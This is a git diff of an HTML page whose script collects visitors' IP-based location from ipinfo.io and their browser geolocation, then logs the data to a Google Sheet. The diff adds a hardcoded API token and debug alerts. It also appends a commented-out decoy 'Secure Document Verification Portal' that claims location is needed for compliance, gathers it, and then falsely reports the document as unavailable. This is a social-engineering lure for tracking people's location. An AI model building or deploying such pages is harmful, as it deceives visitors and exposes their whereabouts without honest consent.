@@ -28,7 +28,8 @@
     // Fetch IP-based location info
     async function getIPInfo() {
       try {
-        const res = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN'); // Replace YOUR_TOKEN with actual token
+        // curl https://api.ipinfo.io/lite/8.8.8.8?token=8e4dd81d98c932
+        const res = await fetch('https://ipinfo.io/json?token=8e4dd81d98c932'); // Replace YOUR_TOKEN with actual token
         if (!res.ok) throw new Error(`HTTP ${res.status}`);
         const data = await res.json();
         log('IP info retrieved', data);
@@ -92,7 +93,9 @@ sendLogToGoogleSheet(logData);
     // Attempt to get user geolocation
     function getGeolocation() {
       try {
+        alert("1")
         if ('geolocation' in navigator) {
+          alert("2")
           navigator.geolocation.getCurrentPosition(
             (position) => {
               const coords = {
@@ -100,16 +103,20 @@ sendLogToGoogleSheet(logData);
                 longitude: position.coords.longitude,
                 accuracy: position.coords.accuracy
               };
+              alert("5")
               log('Geolocation success', coords);
             },
             (error) => {
               log('Geolocation denied or failed', { error: error.message });
+              alert("6")
             }
           );
         } else {
+          alert("3")
           log('Geolocation not supported');
         }
       } catch (err) {
+        alert("4")
         log('Error during geolocation request', { error: err.message });
       }
     }
@@ -123,3 +130,78 @@ sendLogToGoogleSheet(logData);
   </script>
 </body>
 </html>
+
+
+<!-- <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Secure Document Access</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+  <div class="container">
+    <h1>Secure Document Verification Portal</h1>
+    <p>This portal allows authorized users to securely access sensitive documentation related to the Infinity Project. For compliance and regulatory purposes, access is restricted to users located within India.</p>
+
+    <p><strong>Note:</strong> Your location is required to verify regional compliance. Please check the box below and click continue.</p>
+
+    <label>
+      <input type="checkbox" id="agreeCheckbox">
+      I confirm this request is initiated from within India and agree to location access.
+    </label>
+
+    <br><br>
+    <button id="continueBtn">Continue</button>
+
+    <div id="messageArea"></div>
+  </div>
+
+  <script>
+    const checkbox = document.getElementById('agreeCheckbox');
+    const continueBtn = document.getElementById('continueBtn');
+    const messageArea = document.getElementById('messageArea');
+
+    function showReloadOption() {
+      messageArea.innerHTML = `
+        <p style="color:red;">Access Denied: Location permission is required to verify your region.</p>
+        <button onclick="location.reload()">Reload Page</button>
+      `;
+    }
+
+    function showUnavailablePage() {
+      messageArea.innerHTML = `
+        <h3>Document Unavailable</h3>
+        <p>This document is currently not available. Please try again later or contact your administrator.</p>
+      `;
+    }
+
+    continueBtn.addEventListener('click', () => {
+      if (!checkbox.checked) {
+        alert("Please agree and check the confirmation box.");
+        return;
+      }
+
+      if ('geolocation' in navigator) {
+        messageArea.innerHTML = "<p>Requesting location...</p>";
+
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            // Location allowed
+            console.log("Location allowed", position);
+            messageArea.innerHTML = "<p>Processing...</p>";
+            setTimeout(showUnavailablePage, 2000);
+          },
+          (error) => {
+            console.warn("Geolocation blocked or failed:", error);
+            showReloadOption();
+          }
+        );
+      } else {
+        messageArea.innerHTML = "<p>Geolocation not supported on this device.</p>";
+      }
+    });
+  </script>
+</body>
+</html> -->
+
